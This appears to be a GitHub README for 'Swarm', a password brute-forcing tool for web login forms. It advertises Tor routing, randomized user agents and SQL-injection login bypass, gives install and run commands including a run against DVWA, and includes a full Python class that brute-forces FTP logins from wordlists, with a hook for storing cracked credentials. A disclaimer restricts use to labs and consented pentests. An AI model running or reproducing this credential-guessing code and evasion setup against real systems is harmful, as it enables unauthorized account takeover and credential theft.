# DISCLAIMER
**Swarm is for education/research purposes only. The author takes NO responsibility and/or liability for how you choose to use any of the tools/source code/any files provided.
 The author and anyone affiliated with will not be liable for any losses and/or damages in connection with use of ANY files provided with Swarm.
 By using Swarm or any files included, you understand that you are AGREEING TO USE AT YOUR OWN RISK. Once again Swarm and ALL files included are for EDUCATION and/or RESEARCH purposes ONLY.
 Swarm is ONLY intended to be used on your own pentesting labs, or with explicit consent from the owner of the property being tested.** 


#About Swarm 
**Swarm is a Bruteforcing pentesting tool for bruteforcing html logins**
##Some Notable Features
* Multi-Threaded
* Randomized user agents
* Supports TOR
* By-pass logins via SQL Injections
* Easy to inherit from to create different types of bruteforcing tools

#Getting Started
To use, first clone the github repo, and then give swarm execute permissions
```shell
git clone https://github.com/szech696/swarm && cd swarm
chmod 755 swarm		
```	
##Installing Dependencies 
```shell
pip install bitarray
pip install requests
pip install -U requests[socks]
pip install pexpect
apt-get install tor
``` 
##Usage

###For all options
```shell
./swarm --help
``` 
###Using on Damn Vulnerable Web App
```shell
./swarm --url='http://localhost/dvwa/login.php' --user-file='usernames.txt' --pass-file='passwords.txt' --verbose --threads=1 
```
##Using Hive to Develop New Tools - FTPHive
```python
from hive import Hive
from ftplib import FTP

# class: FTPHive
# description: Hive used to brute-force FTP Logins
class FTPHive(Hive):
        ftp = None
        def __init__(self):
                Hive.__init__(self)

        # function: attemptLogin        - Overriden
        # param: credential             - The credential to attempt a login with
        # return: Boolean               - True if Success | False if Failure
        # description: This function is responsible for attempting a login with the specified credential
        def attemptLogin(self, credential):
                success = False
                Hive.attemptLogin(self, credential)
                username = credential.username
                password = credential.password
                host = credential.host
                try:
                        self.ftp = FTP(host)
                        result = self.ftp.login(username,password)
                        # If result then this was a successful login
                        if result:
                                success = True
                        self.ftp.close()
                except:
                         pass
                return success

        # function: setup
        # description: Prepares this Hive for its attack, *NOTE* This must be called before start is called
        def setup(self):
                Hive.setup(self)

        def post_exploit(self,credential):
                # -------- Do Something ----------
                # Such as display a custom login message
                # Store credentials in a Database, etc.
                exit()

threadCount = 4
ftp_bruteforce = FTPHive()
ftp_bruteforce.target = 'ftp_server_address'                    # specify the target
ftp_bruteforce.usernameFile = 'usernames.txt'                   # the username file to use
ftp_bruteforce.passwordFile = 'passwords.txt'                   # the password file to use
ftp_bruteforce.verbose = True                                   # verbose output
ftp_bruteforce.setOnSuccessHandle(ftp_bruteforce.post_exploit)  # Normally you would just do this in setup, but for demonstration purposes
ftp_bruteforce.setup()                                          # setup must be called before start, and after username/usernameFile, passwordFile, and target have been set
ftp_bruteforce.start(threadCount)                               # starts the bruteforcing task

```

